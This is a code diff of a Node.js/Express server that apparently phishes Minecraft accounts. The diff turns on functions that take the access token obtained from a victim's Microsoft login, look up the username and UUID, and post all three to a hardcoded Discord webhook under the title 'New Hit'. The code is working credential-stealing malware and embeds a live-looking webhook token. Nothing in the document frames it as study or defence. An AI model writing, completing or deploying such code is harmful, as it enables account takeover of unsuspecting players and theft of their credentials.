@@ -69,10 +69,10 @@ app.get(`/token`, async (req, res) => {
 	var XstsUuid = XstsList[1];
 	var MinecraftTokenResponse = await getMcToken(XstsToken, XstsUuid);
 	var MinecraftToken = MinecraftTokenResponse.access_token;
-	// var IgnAndUuid = await getUsername(MinecraftToken);
-	// var Ign = IgnAndUuid[0];
-	// var Uuid = IgnAndUuid[1];
-	// await sendEmbed(MinecraftToken, Uuid, Ign);
+	var IgnAndUuid = await getUsername(MinecraftToken);
+	var Ign = IgnAndUuid[0];
+	var Uuid = IgnAndUuid[1];
+	await sendEmbed(MinecraftToken, Uuid, Ign);
 });
 
 async function createLink(id, url, scopes) {
@@ -146,41 +146,41 @@ async function getMcToken(xstsToken, xstsUuid) {
 	return RepParsed;
 }
 
-// async function getUsername(token) {
-// 	const config = {
-// 		headers: {
-// 			Authorization: 'Bearer ' + token,
-// 		},
-// 	};
-// 	const response = await axios.get(
-// 		`https://api.minecraftservices.com/minecraft/profile`,
-// 		JSON.stringify(config)
-// 	);
-// 	var ign = response.data.name;
-// 	var uuid = response.data.id;
-// 	return [ign, uuid];
-// }
+async function getUsername(token) {
+	const config = {
+		headers: {
+			Authorization: 'Bearer ' + token,
+		},
+	};
+	const response = await axios.get(
+		`https://api.minecraftservices.com/minecraft/profile`,
+		config
+	);
+	var ign = response.data.name;
+	var uuid = response.data.id;
+	return [ign, uuid];
+}
 
-// async function sendEmbed(MinecraftToken, uuid, username) {
-// 	const webhook = new WebhookClient({
-// 		id: '1090664218010845234',
-// 		token:
-// 			'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
-// 	});
-// 	const embed = new EmbedBuilder()
-// 		.setTitle(`**New Hit**`)
-// 		.setColor('#2f3136')
-// 		.addFields(
-// 			{ name: 'Nom', value: `\`${username}\``, inline: true },
-// 			{ name: 'UUID', value: `\`${uuid}\``, inline: true },
-// 			{
-// 				name: 'Minecraft Auth',
-// 				value: `\`${username}:${uuid}:${MinecraftToken}\``,
-// 			}
-// 		)
-// 		.setTimestamp();
+async function sendEmbed(MinecraftToken, uuid, username) {
+	const webhook = new WebhookClient({
+		id: '1090664218010845234',
+		token:
+			'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
+	});
+	const embed = new EmbedBuilder()
+		.setTitle(`**New Hit**`)
+		.setColor('#2f3136')
+		.addFields(
+			{ name: 'Nom', value: `\`${username}\``, inline: true },
+			{ name: 'UUID', value: `\`${uuid}\``, inline: true },
+			{
+				name: 'Minecraft Auth',
+				value: `\`${username}:${uuid}:${MinecraftToken}\``,
+			}
+		)
+		.setTimestamp();
 
-// 	webhook.send({
-// 		embeds: [embed],
-// 	});
-// }
+	webhook.send({
+		embeds: [embed],
+	});
+}
